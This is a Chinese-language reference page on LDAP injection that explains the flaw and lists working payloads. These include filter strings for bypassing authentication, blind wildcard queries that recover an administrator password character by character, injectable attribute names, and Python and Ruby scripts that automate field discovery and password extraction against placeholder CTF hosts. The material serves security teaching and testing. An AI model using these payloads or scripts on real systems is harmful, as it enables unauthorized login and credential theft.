# LDAP 注入

> LDAP 注入是一种攻击方式，用于利用基于Web的应用程序，这些应用程序根据用户输入构建LDAP语句。当应用程序未能正确清理用户输入时，就可能通过本地代理修改LDAP语句。

## 概述

* [方法论](#方法论)
    * [绕过身份验证](#绕过身份验证)
    * [盲注入](#盲注入)
* [默认属性](#默认属性)
* [利用 userPassword 属性](#利用-userpassword-属性)
* [脚本](#脚本)
    * [发现有效的LDAP字段](#发现有效的ldap字段)
    * [特殊的盲LDAP注入](#特殊的盲ldap注入)
* [实验室](#实验室)
* [参考文献](#参考文献)

## 方法论

LDAP 注入是一种漏洞，当未经适当清理或转义的用户输入被用来构造LDAP查询时就会发生。

### 绕过身份验证

尝试通过注入总是为真的条件来操纵过滤器逻辑。

**示例 1**：此LDAP查询利用查询结构中的逻辑运算符，可能绕过身份验证。

```sql
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

**示例 2**：此LDAP查询利用查询结构中的逻辑运算符，可能绕过身份验证。

```sql
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

### 盲注入

此场景演示了使用类似于二进制搜索或基于字符的暴力破解技术进行LDAP盲注入，以发现敏感信息（如密码）。它依赖于LDAP过滤器根据条件是否匹配而响应不同查询的事实，而不直接揭示实际密码。

```sql
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```

**LDAP过滤器分解**：

* `&`：逻辑AND操作符，意味着内部的所有条件都必须为真。
* `(sn=administrator)`：匹配sn（姓氏）属性为管理员的条目。
* `(password=X*)`：匹配密码以X开头的条目（区分大小写）。星号（*）是通配符，代表任意剩余字符。

## 默认属性

可以用于注入，例如 `*)(ATTRIBUTE_HERE=*)`

```bash
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName
```

## 利用 userPassword 属性

`userPassword` 属性不是像 `cn` 属性那样的字符串，而是 OCTET STRING。
在LDAP中，每个对象、类型、操作符等都由OID引用：octetStringOrderingMatch（OID 2.5.13.18）。

> octetStringOrderingMatch（OID 2.5.13.18）：一种排序匹配规则，将对两个八位字节字符串值逐比特比较（大端序），直到找到差异。第一个零比特出现在一个值中但一比特出现在另一个值中时，将具有零比特的值视为小于具有一比特的值。

```bash
userPassword:2.5.13.18:=\xx (\xx 是一个字节)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

## 脚本

### 发现有效的LDAP字段

```python
#!/usr/bin/python3
import requests
import string

fields = []
url = 'https://URL.com/'
f = open('dic', 'r')
world = f.read().split('\n')
f.close()

for i in world:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) # Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
    if 'TRUE CONDITION' in r.text:
        fields.append(str(i))

print(fields)
```

### 特殊的盲LDAP注入

```python
#!/usr/bin/python3
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break
```

Exploitation脚本由 [@noraj](https://github.com/noraj) 提供

```ruby
#!/usr/bin/env ruby
require 'net/http'
alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

flag = ''
(0..50).each do |i|
  puts("[i] Looking for number #{i}")
  alphabet.each do |char|
    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
    if /TRUE CONDITION/.match?(r)
      flag += char
      puts("[+] Flag: #{flag}")
      break
    end
  end
end
```

## 实验室

* [Root Me - LDAP注入 - 身份验证](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)
* [Root Me - LDAP注入 - 盲注入](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Blind)

## 参考文献

* [[欧洲网络周] - AdmYSion - Alan Marrec (Maki)](https://www.maki.bzh/writeups/ecw2018admyssion/)
* [ECW 2018 : 写入 - AdmYSsion (WEB - 50) - 0xUKN - 2018年10月31日](https://0xukn.fr/posts/writeupecw2018admyssion/)
* [如何配置OpenLDAP并执行管理LDAP任务 - Justin Ellingwood - 2015年5月30日](https://www.digitalocean.com/community/tutorials/how-to-configure-openldap-and-perform-administrative-ldap-tasks)
* [如何使用OpenLDAP工具管理和使用LDAP服务器 - Justin Ellingwood - 2015年5月29日](https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities)
* [LDAP盲探器 - Alonso Parada - 2011年8月12日](http://code.google.com/p/ldap-blind-explorer/)
* [LDAP注入与盲LDAP注入 - Chema Alonso, José Parada Gimeno - 2008年10月10日](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)
* [LDAP注入预防备忘单 - OWASP - 2019年7月16日](https://www.owasp.org/index.php/LDAP_injection)